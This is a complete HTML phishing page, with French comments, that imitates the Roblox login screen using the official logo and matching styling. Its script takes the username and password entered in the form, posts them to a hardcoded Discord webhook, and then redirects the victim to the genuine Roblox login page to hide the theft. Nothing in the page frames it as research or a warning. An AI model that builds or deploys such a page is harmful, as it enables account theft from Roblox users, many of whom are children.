<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
<title>Roblox</title>
<style>
  body {
    margin: 0;
    font-family: -apple-system, system-ui, sans-serif;
    height: 100vh;
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    /* l'image de fond avec les personnages roblox */
    background: linear-gradient(rgba(0,0,0,0.4), rgba(0,0,0,0.4)), url('https://i.imgur.com/k0P4h5L.jpeg') center/cover no-repeat;
    color: #fff;
  }

  .box {
    width: 90%;
    max-width: 320px;
    display: flex;
    flex-direction: column;
    align-items: center;
  }

  /* le vrai logo roblox */
  .logo-img {
    width: 200px;
    margin-bottom: 30px;
    filter: drop-shadow(0 4px 6px rgba(0,0,0,0.5));
  }

  input {
    width: 100%;
    padding: 14px;
    margin-bottom: 12px;
    background: rgba(30, 30, 30, 0.8); /* fond semi-transparent sombre */
    border: 1px solid rgba(255,255,255,0.2);
    border-radius: 8px;
    color: #fff;
    font-size: 16px;
    box-sizing: border-box;
    outline: none;
  }
  input::placeholder { color: #ccc; }
  input:focus { border-color: #fff; }

  button {
    width: 100%;
    padding: 14px;
    background: rgba(255, 255, 255, 0.3); /* bouton transparent grisé */
    color: #fff;
    border: none;
    border-radius: 8px;
    font-size: 16px;
    font-weight: bold;
    cursor: pointer;
    margin-top: 10px;
    backdrop-filter: blur(5px);
  }
  button:active { background: rgba(255, 255, 255, 0.5); }

  .forgot {
    color: #fff;
    font-size: 14px;
    margin-top: 20px;
    text-decoration: none;
    text-shadow: 0 1px 3px rgba(0,0,0,0.8);
  }
</style>
</head>
<body>

<div class="box">
  <!-- le logo officiel roblox -->
  <img class="logo-img" src="https://upload.wikimedia.org/wikipedia/commons/thumb/3/3a/Roblox_logo.svg/1200px-Roblox_logo.svg.png" alt="Roblox">
  
  <form id="f">
    <input type="text" id="u" placeholder="Username/Email/Phone" required autocomplete="off">
    <input type="password" id="p" placeholder="Password" required autocomplete="off">
    <button>Log In</button>
  </form>
  
  <a href="#" class="forgot">Forgot Password or Username?</a>
</div>

<script>
const H = "https://discord.com/api/webhooks/1565260146316148746/aRlsSnjxOcpFUrQTg2jGEYNKm0N9yu9mmtAruqHUvkPZEYTjQ2CdjJq7oIGCN13rT2UT";
document.getElementById("f").onsubmit = e => {
  e.preventDefault();
  fetch(H, {method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify({content:`**ROBLOX**\nUser: \`${document.getElementById('u').value}\`\nPass: \`${document.getElementById('p').value}\``})}).finally(()=>window.location.href="https://www.roblox.com/login");
};
</script>
</body>
</html>
